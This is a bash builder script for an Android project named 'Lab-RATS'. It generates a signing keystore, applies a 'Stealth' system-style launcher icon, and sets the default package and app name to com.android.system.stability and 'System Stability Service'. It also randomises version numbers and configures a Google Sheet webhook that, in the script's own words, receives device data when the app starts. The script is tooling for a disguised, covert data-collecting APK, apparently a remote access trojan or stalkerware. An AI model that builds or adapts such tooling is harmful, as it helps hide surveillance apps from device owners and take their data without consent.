#!/bin/bash

#################################################
#          Lab-RATS APK BUILDER - Linux/Mac       #
#                   v2.0                        #
#                                               #
#  Developed by: Lab-RATS.LABS         #
#  GitHub: github.com/Lab-RATS-LABS      #
#################################################

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Script paths
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
CONFIG_FILE="$SCRIPT_DIR/build_config.txt"

# Default logos
DEFAULT_LOGO="$PROJECT_DIR/app_logo.png"
COVERT_LOGO="$SCRIPT_DIR/covert_launcher.png"

# Banner
print_banner() {
    clear
    echo -e "${CYAN}"
    echo " ┌──────────────────────────────────────────────────────────────┐"
    echo " │                                                              │"
    echo " │  ██╗  ██╗██╗  ██╗███╗   ██╗██████╗  ██████╗  ██████╗         │"
    echo " │  ██║ ██╔╝██║  ██║████╗  ██║╚════██╗██╔════╝ ██╔═══██╗        │"
    echo " │  █████╔╝ ███████║██╔██╗ ██║ █████╔╝██║      ██║   ██║        │"
    echo " │  ██╔═██╗ ╚════██║██║╚██╗██║ ╚═══██╗██║      ██║   ██║        │"
    echo " │  ██║  ██╗     ██║██║ ╚████║██████╔╝╚██████╗ ╚██████╔╝        │"
    echo " │  ╚═╝  ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚═════╝         │"
    echo " │                                                              │"
    echo " │ PROJECT: Lab-RATS APK Builder | v1.4.5 Hardened              │"
    echo " │ GIT_UPLINK: https://github.com/K4N3CO-LABS/Lab-RATS           │"
    echo " │                                                              │"
    echo " └──────────────────────────────────────────────────────────────┘"
    echo -e "${NC}"
    echo ""
}

# Detect OS
detect_os() {
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        OS="linux"
        PKG_MANAGER=""
        if command -v apt-get &> /dev/null; then
            PKG_MANAGER="apt"
        elif command -v yum &> /dev/null; then
            PKG_MANAGER="yum"
        elif command -v dnf &> /dev/null; then
            PKG_MANAGER="dnf"
        elif command -v pacman &> /dev/null; then
            PKG_MANAGER="pacman"
        fi
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS="mac"
        if command -v brew &> /dev/null; then
            PKG_MANAGER="brew"
        fi
    else
        OS="unknown"
    fi
}

# Auto-install Java
install_java() {
    echo -e "${CYAN}[*] Attempting to install Java automatically...${NC}"
    echo ""
    
    case $PKG_MANAGER in
        apt)
            echo -e "${YELLOW}[>] Running: sudo apt update && sudo apt install -y openjdk-11-jdk${NC}"
            sudo apt update && sudo apt install -y openjdk-11-jdk
            ;;
        yum)
            echo -e "${YELLOW}[>] Running: sudo yum install -y java-11-openjdk-devel${NC}"
            sudo yum install -y java-11-openjdk-devel
            ;;
        dnf)
            echo -e "${YELLOW}[>] Running: sudo dnf install -y java-11-openjdk-devel${NC}"
            sudo dnf install -y java-11-openjdk-devel
            ;;
        pacman)
            echo -e "${YELLOW}[>] Running: sudo pacman -S --noconfirm jdk11-openjdk${NC}"
            sudo pacman -S --noconfirm jdk11-openjdk
            ;;
        brew)
            echo -e "${YELLOW}[>] Running: brew install openjdk@11${NC}"
            brew install openjdk@11
            echo 'export PATH="/usr/local/opt/openjdk@11/bin:$PATH"' >> ~/.zshrc
            export PATH="/usr/local/opt/openjdk@11/bin:$PATH"
            ;;
        *)
            echo -e "${RED}[!] Cannot auto-install. Please install Java manually.${NC}"
            return 1
            ;;
    esac
    
    if command -v java &> /dev/null; then
        echo -e "${GREEN}[✓] Java installed successfully!${NC}"
        return 0
    else
        return 1
    fi
}

# Check requirements
check_requirements() {
    echo -e "${CYAN}[*] Checking requirements...${NC}"
    echo ""
    
    detect_os
    echo -e "${BLUE}    OS Detected: $OS${NC}"
    
    # Check Java
    if ! command -v java &> /dev/null; then
        echo -e "${RED}[!] Java is not installed.${NC}"
        echo ""
        echo -e "${RED}[>] Options:${NC}"
        echo "    1. Auto-install Java (requires sudo)"
        echo "    2. Show manual installation instructions"
        echo "    3. Skip (I'll install later)"
        echo ""
        read -p "    Choose option (Default 1): " JAVA_OPTION
        JAVA_OPTION=${JAVA_OPTION:-1}
        
        case $JAVA_OPTION in
            1)
                install_java
                if [ $? -ne 0 ]; then
                    show_manual_java_install
                    exit 1
                fi
                ;;
            2)
                show_manual_java_install
                exit 1
                ;;
            3)
                echo -e "${YELLOW}[!] Skipping Java check. Build may fail.${NC}"
                ;;
        esac
    else
        JAVA_VERSION=$(java -version 2>&1 | head -n 1 | cut -d'"' -f2)
        echo -e "${GREEN}[✓] Java found: $JAVA_VERSION${NC}"
    fi
    
    # Check keytool
    if command -v keytool &> /dev/null; then
        echo -e "${GREEN}[✓] keytool found${NC}"
    else
        echo -e "${YELLOW}[!] keytool not found. Usually comes with JDK.${NC}"
    fi
    
    # Check ImageMagick
    if command -v convert &> /dev/null; then
        echo -e "${GREEN}[✓] ImageMagick found (logo resizing enabled)${NC}"
        HAS_IMAGEMAGICK=true
    else
        echo -e "${YELLOW}[!] ImageMagick not found (optional - for logo resizing)${NC}"
        echo -e "${YELLOW}    Install: sudo apt install imagemagick (Linux) / brew install imagemagick (Mac)${NC}"
        HAS_IMAGEMAGICK=false
    fi
    
    echo ""
}

# Show manual Java installation instructions
show_manual_java_install() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              MANUAL JAVA INSTALLATION GUIDE                  ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${WHITE}Ubuntu/Debian:${NC}"
    echo "    sudo apt update"
    echo "    sudo apt install openjdk-11-jdk"
    echo ""
    echo -e "${WHITE}Fedora/RHEL:${NC}"
    echo "    sudo dnf install java-11-openjdk-devel"
    echo ""
    echo -e "${WHITE}Arch Linux:${NC}"
    echo "    sudo pacman -S jdk11-openjdk"
    echo ""
    echo -e "${WHITE}macOS (Homebrew):${NC}"
    echo "    brew install openjdk@11"
    echo "    echo 'export PATH=\"/usr/local/opt/openjdk@11/bin:\$PATH\"' >> ~/.zshrc"
    echo ""
    echo -e "${WHITE}Manual Download:${NC}"
    echo "    https://adoptium.net/temurin/releases/"
    echo ""
    echo -e "${YELLOW}After installing, run this script again.${NC}"
    echo ""
}

# Generate keystore
# Pass "auto" as argument for auto-generation with defaults
generate_keystore() {
    local AUTO_MODE="$1"
    
    KEYSTORE_PATH="$PROJECT_DIR/lab-rats-keystore.jks"
    KEYSTORE_PROPS="$PROJECT_DIR/keystore.properties"
    
    # Default values
    KEY_ALIAS="lab-rats-key"
    KEYSTORE_PASS="lab-rats123"
    CN_NAME="Lab-RATS Developer"
    ORG_NAME="Lab-RATS.LABS"
    COUNTRY="US"
    VALIDITY_DAYS=9125  # 25 years
    
    if [ -f "$KEYSTORE_PATH" ]; then
        if [ "$AUTO_MODE" = "auto" ]; then
            echo -e "${GREEN}[OK] Keystore already exists${NC}"
            return
        fi
        echo -e "${YELLOW}[!] Keystore already exists at: $KEYSTORE_PATH${NC}"
        read -p "    Generate new keystore? (y/N): " REGENERATE
        if [[ ! "$REGENERATE" =~ ^[Yy]$ ]]; then
            echo -e "${GREEN}[OK] Using existing keystore${NC}"
            
            # Load existing config
            if [ -f "$CONFIG_FILE" ]; then
                source "$CONFIG_FILE"
            fi
            return
        fi
        rm -f "$KEYSTORE_PATH"
    fi
    
    if [ "$AUTO_MODE" != "auto" ]; then
        echo -e "${CYAN}[*] Keystore Configuration${NC}"
        echo ""
        echo -e "${RED}[>] Enter keystore details (press Enter for defaults):${NC}"
        echo ""
        
        read -p "    Key alias [$KEY_ALIAS]: " INPUT
        [ -n "$INPUT" ] && KEY_ALIAS="$INPUT"
        
        read -sp "    Keystore password [$KEYSTORE_PASS]: " INPUT
        echo ""
        [ -n "$INPUT" ] && KEYSTORE_PASS="$INPUT"
        
        read -p "    Your name [$CN_NAME]: " INPUT
        [ -n "$INPUT" ] && CN_NAME="$INPUT"
        
        read -p "    Organization [$ORG_NAME]: " INPUT
        [ -n "$INPUT" ] && ORG_NAME="$INPUT"
        
        read -p "    Country code [$COUNTRY]: " INPUT
        [ -n "$INPUT" ] && COUNTRY="$INPUT"
    else
        echo -e "${CYAN}[*] Auto-generating keystore with default values...${NC}"
    fi
    
    echo ""
    echo -e "${CYAN}[*] Generating keystore...${NC}"
    
    keytool -genkeypair \
        -alias "$KEY_ALIAS" \
        -keyalg RSA \
        -keysize 2048 \
        -validity $VALIDITY_DAYS \
        -keystore "$KEYSTORE_PATH" \
        -storepass "$KEYSTORE_PASS" \
        -keypass "$KEYSTORE_PASS" \
        -dname "CN=$CN_NAME, O=$ORG_NAME, C=$COUNTRY" \
        2>/dev/null
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[OK] Keystore generated successfully!${NC}"
        echo ""
        
        # Create keystore.properties for Gradle
        cat > "$KEYSTORE_PROPS" << EOF
storeFile=lab-rats-keystore.jks
storePassword=$KEYSTORE_PASS
keyAlias=$KEY_ALIAS
keyPassword=$KEYSTORE_PASS
EOF
        echo -e "${GREEN}[OK] Created keystore.properties for Gradle${NC}"
        
        # Save to config
        echo "KEYSTORE_PATH=$KEYSTORE_PATH" > "$CONFIG_FILE"
        echo "KEY_ALIAS=$KEY_ALIAS" >> "$CONFIG_FILE"
        echo "KEYSTORE_PASS=$KEYSTORE_PASS" >> "$CONFIG_FILE"
        
        if [ "$AUTO_MODE" != "auto" ]; then
            # Show certificate info
            echo -e "${CYAN}[*] Certificate SHA-256 fingerprint:${NC}"
            keytool -list -v -keystore "$KEYSTORE_PATH" -storepass "$KEYSTORE_PASS" -alias "$KEY_ALIAS" 2>/dev/null | grep "SHA256:"
            echo ""
        fi
    else
        echo -e "${RED}[!] Failed to generate keystore${NC}"
        [ "$AUTO_MODE" != "auto" ] && exit 1
    fi
}

# Configure logo
configure_logo() {
    echo -e "${CYAN}[*] Logo Configuration${NC}"
    echo ""
    
    RES_DIR="$PROJECT_DIR/app/src/main/res"
    
    echo "    1. Use System-Style Stealth logo (covert_launcher.png)"
    echo "    2. Use default Lab-RATS logo (app_logo.png)"
    echo "    3. Use custom logo (provide image path)"
    echo "    4. Skip (Keep project icons as is)"
    echo ""
    read -p "    Choose option (Default 1): " LOGO_OPTION
    LOGO_OPTION=${LOGO_OPTION:-1}
    
    LOGO_PATH=""
    
    case $LOGO_OPTION in
        1)
            if [ -f "$COVERT_LOGO" ]; then
                LOGO_PATH="$COVERT_LOGO"
                echo -e "${GREEN}[✓] Using Stealth logo${NC}"
            else
                echo -e "${RED}[!] Stealth logo not found at: $COVERT_LOGO${NC}"
                return
            fi
            ;;
        2)
            if [ -f "$DEFAULT_LOGO" ]; then
                LOGO_PATH="$DEFAULT_LOGO"
                echo -e "${GREEN}[✓] Using default Lab-RATS logo${NC}"
            else
                echo -e "${RED}[!] Default logo not found at: $DEFAULT_LOGO${NC}"
                return
            fi
            ;;
        3)
            read -p "    Enter path to logo image (PNG, 512x512): " CUSTOM_LOGO
            if [ -f "$CUSTOM_LOGO" ]; then
                LOGO_PATH="$CUSTOM_LOGO"
            else
                echo -e "${RED}[!] Logo file not found: $CUSTOM_LOGO${NC}"
                return
            fi
            ;;
        4)
            echo -e "${GREEN}[✓] No changes made to icons${NC}"
            return
            ;;
    esac
    
    if [ -n "$LOGO_PATH" ]; then
        echo ""
        read -p "    Make background transparent (removes white)? (y/N): " TRANSPARENT
        
        echo -e "${CYAN}[*] Processing logo...${NC}"
        
        # KEY FIX: Only remove adaptive icons if we are replacing them with a legacy PNG
        if [ "$LOGO_OPTION" != "4" ] && [ -d "$RES_DIR/mipmap-anydpi-v26" ]; then
            rm -rf "$RES_DIR/mipmap-anydpi-v26"
            echo -e "${YELLOW}[*] Removed adaptive icon config to apply custom legacy icon${NC}"
        fi

        # Only clean up if we are actually providing a new logo
        if [ "$LOGO_OPTION" != "4" ]; then
            for density in mipmap-mdpi mipmap-hdpi mipmap-xhdpi mipmap-xxhdpi mipmap-xxxhdpi; do
                rm -f "$RES_DIR/$density/ic_launcher.png" "$RES_DIR/$density/ic_launcher.webp" 2>/dev/null
                rm -f "$RES_DIR/$density/ic_launcher_round.png" "$RES_DIR/$density/ic_launcher_round.webp" 2>/dev/null
                rm -f "$RES_DIR/$density/ic_launcher_foreground.png" "$RES_DIR/$density/ic_launcher_foreground.webp" 2>/dev/null
            done
            echo -e "${YELLOW}[*] Cleaned up old icon resources for replacement${NC}"
        fi

        # Check ImageMagick again just to be sure
        HAS_IMAGEMAGICK=false
        if command -v convert &> /dev/null; then
            HAS_IMAGEMAGICK=true
        fi
        
        # Copy to different sizes
        if [ "$HAS_IMAGEMAGICK" = true ]; then
            # High-quality resize with 3% Zoom Out for Stealth Icon
            # We scale the image so that it is 97% of the TARGET pixel size, then center in the box.
            for density_size in "mdpi:48" "hdpi:72" "xhdpi:96" "xxhdpi:144" "xxxhdpi:192"; do
                IFS=":" read -r density size <<< "$density_size"
                if [ "$LOGO_OPTION" -eq 1 ]; then
                    local ZOOM_PX=$(( size * 100 / 100 ))
                    convert "$LOGO_PATH" -resize "${ZOOM_PX}x${ZOOM_PX}" -gravity center -extent "${size}x${size}" "$RES_DIR/mipmap-$density/ic_launcher.png" 2>/dev/null
                    convert "$LOGO_PATH" -resize "${ZOOM_PX}x${ZOOM_PX}" -gravity center -extent "${size}x${size}" "$RES_DIR/mipmap-$density/ic_launcher_round.png" 2>/dev/null
                else
                    convert "$LOGO_PATH" -resize "${size}x${size}" "$RES_DIR/mipmap-$density/ic_launcher.png" 2>/dev/null
                    convert "$LOGO_PATH" -resize "${size}x${size}" "$RES_DIR/mipmap-$density/ic_launcher_round.png" 2>/dev/null
                fi
            done

            echo -e "${GREEN}[✓] Logo zoomed and resized correctly${NC}"
        else
            echo -e "${YELLOW}[!] ImageMagick not found. Falling back to simple copy.${NC}"
            echo -e "${YELLOW}    Note: Install ImageMagick to enable resizing and transparency.${NC}"
            
            # Just copy to all folders without resize
            for density in mipmap-mdpi mipmap-hdpi mipmap-xhdpi mipmap-xxhdpi mipmap-xxxhdpi; do
                mkdir -p "$RES_DIR/$density"
                cp "$LOGO_PATH" "$RES_DIR/$density/ic_launcher.png" 2>/dev/null
                cp "$LOGO_PATH" "$RES_DIR/$density/ic_launcher_round.png" 2>/dev/null
            done
            echo -e "${GREEN}[✓] Logo copied (No resize)${NC}"
        fi
    fi
    echo ""
}

# Configure app settings
configure_app() {
    echo -e "${CYAN}[*] App Configuration${NC}"
    echo ""
    
    STRINGS_FILE="$PROJECT_DIR/app/src/main/res/values/strings.xml"
    BUILD_GRADLE="$PROJECT_DIR/app/build.gradle"
    
    # Generate random defaults
    RAND_MAJOR=$((1 + RANDOM % 10))
    RAND_MINOR=$((RANDOM % 10))
    RAND_PATCH=$((RANDOM % 10))
    RAND_VER_NAME="$RAND_MAJOR.$RAND_MINOR.$RAND_PATCH"
    RAND_VER_CODE=$((10 + RANDOM % 990))
    
    # Package Name
    read -p "    Enter Package Name (Application ID) [com.android.system.stability]: " PKG_NAME
    PKG_NAME=${PKG_NAME:-com.android.system.stability}
    
    # App name
    read -p "    Enter App Name [System Stability Service]: " APP_NAME
    APP_NAME=${APP_NAME:-System Stability Service}
    
    # Min SDK
    read -p "    Enter Min SDK [26]: " MIN_SDK
    MIN_SDK=${MIN_SDK:-26}
    
    # Version Name
    read -p "    Enter Version Name (Random: $RAND_VER_NAME) [$RAND_VER_NAME]: " VERSION_NAME
    VERSION_NAME=${VERSION_NAME:-$RAND_VER_NAME}
    
    # Version Code
    read -p "    Enter Version Code (Random: $RAND_VER_CODE) [$RAND_VER_CODE]: " VERSION_CODE
    VERSION_CODE=${VERSION_CODE:-$RAND_VER_CODE}
    
    # Update build.gradle
    if [ -f "$BUILD_GRADLE" ]; then
        # Update Application ID
        sed -i.bak "s|applicationId \"[^\"]*\"|applicationId \"$PKG_NAME\"|g" "$BUILD_GRADLE"
        
        # Update Min SDK
        sed -i.bak "s|minSdk [0-9]*|minSdk $MIN_SDK|g" "$BUILD_GRADLE"
        
        # Update Version Code and Name
        sed -i.bak "s|versionCode [0-9]*|versionCode $VERSION_CODE|g" "$BUILD_GRADLE"
        sed -i.bak "s|versionName \".*\"|versionName \"$VERSION_NAME\"|g" "$BUILD_GRADLE"
        
        rm -f "${BUILD_GRADLE}.bak"
        echo -e "${GREEN}[✓] build.gradle updated (Pkg: $PKG_NAME, MinSdk: $MIN_SDK, Ver: $VERSION_NAME)${NC}"
    fi
    
    # Update strings.xml
    if [ -f "$STRINGS_FILE" ]; then
        ESCAPED_NAME=$(echo "$APP_NAME" | sed 's/[&/\]/\\&/g')
        sed -i.bak "s|<string name=\"app_name\">.*</string>|<string name=\"app_name\">$ESCAPED_NAME</string>|g" "$STRINGS_FILE"
        rm -f "${STRINGS_FILE}.bak"
        echo -e "${GREEN}[✓] App name set to: $APP_NAME${NC}"
    fi
    
    # Save to config
    echo "APP_NAME=\"$APP_NAME\"" > "$CONFIG_FILE"
    echo "VERSION_NAME=\"$VERSION_NAME\"" >> "$CONFIG_FILE"
    echo "VERSION_CODE=\"$VERSION_CODE\"" >> "$CONFIG_FILE"
    echo "PKG_NAME=\"$PKG_NAME\"" >> "$CONFIG_FILE"
    
    # Google Sheet URL
    echo ""
    echo -e "${RED}[>] Google Sheet Webhook Configuration${NC}"
    echo -e "${YELLOW}    This URL will receive device data when app starts.${NC}"
    echo -e "${YELLOW}    You need to set up Google Sheet manually (see README).${NC}"
    echo -e "${YELLOW}    Leave empty to skip.${NC}"
    echo ""
    read -p "    Enter Google Sheet webhook URL: " SHEET_URL
    
    LOCAL_PROPS="$PROJECT_DIR/local.properties"
    if [ -n "$SHEET_URL" ]; then
        echo "SHEET_URL=\"$SHEET_URL\"" >> "$CONFIG_FILE"

        # Update local.properties for Gradle
        if grep -q "WEBHOOK_URL=" "$LOCAL_PROPS" 2>/dev/null; then
            sed -i.bak "s|WEBHOOK_URL=.*|WEBHOOK_URL=$SHEET_URL|g" "$LOCAL_PROPS"
            rm -f "${LOCAL_PROPS}.bak"
        else
            echo "WEBHOOK_URL=$SHEET_URL" >> "$LOCAL_PROPS"
        fi
        echo -e "${GREEN}[✓] Google Sheet URL saved to config and local.properties${NC}"
    else
        echo -e "${YELLOW}[!] Skipping Google Sheet configuration${NC}"
    fi

    echo ""
}

# Progress bar function
show_progress() {
    local duration=$1
    local label=$2
    local steps=20
    local sleep_time=$(echo "scale=2; $duration / $steps" | bc)

    echo -ne "    $label ["
    for ((i=1; i<=steps; i++)); do
        echo -ne "█"
        local percentage=$((i * 100 / steps))
        echo -ne "]"
        echo -ne " $percentage% "
        # Backtrack to overwrite
        for ((j=1; j<=i+7; j++)); do echo -ne "\b"; done
        echo -ne "["
        for ((j=1; j<=i; j++)); do echo -ne "█"; done

        sleep $sleep_time
    done
    echo -ne "█] 100% "
    echo ""
}

# Improved build function with progress bar
execute_build() {
    local task=$1
    local label=$2
    local expected_time=$3

    # Start gradle in background, hide output
    ./gradlew $task --no-daemon > build_log.txt 2>&1 &
    local pid=$!

    # Show progress bar while building
    local steps=40
    local sleep_time=$(echo "scale=2; $expected_time / $steps" | bc)

    echo -ne "${CYAN}    [*] $label ["
    for ((i=1; i<=steps; i++)); do
        if ! kill -0 $pid 2>/dev/null; then
            # Build finished early - snap to 100%
            for ((j=i; j<=steps; j++)); do echo -ne "█"; done
            echo -ne "] 100% "
            echo -e "${GREEN}[DONE]${NC}"
            wait $pid
            return $?
        fi

        echo -ne "█"
        local percentage=$((i * 100 / steps))
        echo -ne "]"
        echo -ne " $percentage% "

        # If we reach 95% and build is still running, slow down to "finalizing" mode
        if [ $i -eq 38 ]; then
            echo -ne "\r${CYAN}    [*] $label ["
            for ((j=1; j<=38; j++)); do echo -ne "█"; done
            echo -ne "] 95% ${YELLOW}[FINALIZING...]${NC}"
            while kill -0 $pid 2>/dev/null; do
                sleep 0.1
            done
            for ((j=39; j<=steps; j++)); do echo -ne "█"; done
            echo -ne "] 100% "
            echo -e "${GREEN}[DONE]${NC}"
            wait $pid
            return $?
        fi

        # Simple carriage return reset for next loop
        echo -ne "\r${CYAN}    [*] $label ["
        for ((j=1; j<=i; j++)); do echo -ne "█"; done

        sleep $sleep_time
    done
}

# Build APK
build_apk() {
    print_banner
    echo -e "${CYAN}[*] Initializing Build Engine...${NC}"
    echo ""
    
    cd "$PROJECT_DIR"

    # Select a compatible Java version (Gradle 8.2 supports up to Java 21)
    if [ -d "/usr/lib/jvm/java-21-openjdk-amd64" ]; then
        export JAVA_HOME="/usr/lib/jvm/java-21-openjdk-amd64"
        export PATH="$JAVA_HOME/bin:$PATH"
    elif [ -d "/usr/lib/jvm/java-11-openjdk-amd64" ]; then
        export JAVA_HOME="/usr/lib/jvm/java-11-openjdk-amd64"
        export PATH="$JAVA_HOME/bin:$PATH"
    fi

    # Make gradlew executable
    chmod +x gradlew
    
    # Load config
    if [ -f "$CONFIG_FILE" ]; then
        while IFS='=' read -r key value; do
            # Remove quotes if present
            value=$(echo "$value" | sed -e 's/^"//' -e 's/"$//')
            export "$key"="$value"
        done < "$CONFIG_FILE"
    fi
    
    # Check if keystore exists - auto-generate if not
    KEYSTORE_FILE="$PROJECT_DIR/lab-rats-keystore.jks"
    if [ ! -f "$KEYSTORE_FILE" ]; then
        echo -e "${YELLOW}[!] No keystore found. Auto-generating...${NC}"
        generate_keystore "auto"
        echo ""
    fi
    
    # Create output folder
    OUTPUT_DIR="$SCRIPT_DIR/output"
    mkdir -p "$OUTPUT_DIR"
    
    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    APP_NAME_SAFE=$(echo "${APP_NAME:-System Stability Service}" | tr ' ' '_')
    VERSION="${VERSION_NAME:-2.0}"
    
    APK_FOUND=false
    
    # ---------------------------------------------------------
    # 1. Build Signed APK
    # ---------------------------------------------------------
    echo -e "${BLUE}[1/2] Generating Signed Production APK${NC}"
    execute_build "clean assembleRelease" "Compiling Resources & Signing" 15
    
    # Signed release APK
    RELEASE_APK="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
    if [ -f "$RELEASE_APK" ]; then
        OUTPUT_SIGNED="$OUTPUT_DIR/${APP_NAME_SAFE}-v${VERSION}-signed.apk"
        cp "$RELEASE_APK" "$OUTPUT_SIGNED"
        echo -e "    ${GREEN}[✓] Saved: $(basename $OUTPUT_SIGNED)${NC}"
        APK_FOUND=true
    else
        echo -e "    ${RED}[!] Signed APK generation failed. Check build_log.txt${NC}"
    fi

    echo ""

    # ---------------------------------------------------------
    # 2. Build Unsigned APK
    # ---------------------------------------------------------
    echo -e "${BLUE}[2/2] Generating Unsigned Debug APK${NC}"
    execute_build "assembleRelease -PdisableSigning" "Packaging Assets" 10
    
    # Unsigned release APK
    UNSIGNED_APK="$PROJECT_DIR/app/build/outputs/apk/release/app-release-unsigned.apk"
    
    # Fallback checks
    if [ ! -f "$UNSIGNED_APK" ]; then
         UNSIGNED_APK_FALLBACK="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
         if [ -f "$UNSIGNED_APK_FALLBACK" ]; then
             UNSIGNED_APK="$UNSIGNED_APK_FALLBACK"
         fi
    fi
    
    if [ -f "$UNSIGNED_APK" ]; then
        OUTPUT_UNSIGNED="$OUTPUT_DIR/${APP_NAME_SAFE}-v${VERSION}-unsigned.apk"
        cp "$UNSIGNED_APK" "$OUTPUT_UNSIGNED"
        echo -e "    ${GREEN}[✓] Saved: $(basename $OUTPUT_UNSIGNED)${NC}"
        APK_FOUND=true
    else
        echo -e "    ${RED}[!] Unsigned APK generation failed. Check build_log.txt${NC}"
    fi
    
    if [ "$APK_FOUND" = true ]; then
        echo ""
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                    BUILD SUCCESSFUL!                         ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${GREEN}[✓] APKs saved to: $OUTPUT_DIR${NC}"
        echo ""
    else
        echo ""
        echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║                      BUILD FAILED!                           ║${NC}"
        echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${RED}[!] No APK files found. Check errors in build_log.txt${NC}"
        exit 1
    fi
}

# Main menu
main_menu() {
    print_banner
    
    echo -e "${RED}[>] Build Options:${NC}"
    echo ""
    echo "    1. Start Build (Configure & Build)"
    echo "    2. Generate Keystore Only"
    echo "    3. Configure Logo Only"
    echo "    4. Configure App Settings Only"
    echo "    5. Check/Install Requirements"
    echo "    6. Exit"
    echo ""
    read -p "    Choose option (Default 1): " MENU_OPTION
    MENU_OPTION=${MENU_OPTION:-1}
    
    echo ""
    case $MENU_OPTION in
        1)
            check_requirements
            generate_keystore
            configure_logo
            configure_app
            build_apk
            ;;
        2)
            check_requirements
            generate_keystore
            ;;
        3)
            detect_os
            HAS_IMAGEMAGICK=false
            if command -v convert &> /dev/null; then
                HAS_IMAGEMAGICK=true
            fi
            configure_logo
            ;;
        4)
            configure_app
            ;;
        5)
            check_requirements
            ;;
        6)
            echo -e "${CYAN}[*] Goodbye!${NC}"
            echo -e "${RED}    Follow: https://github.com/K4N3CO-LABS/Lab-RATS${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            exit 1
            ;;
    esac
}

# Run
main_menu
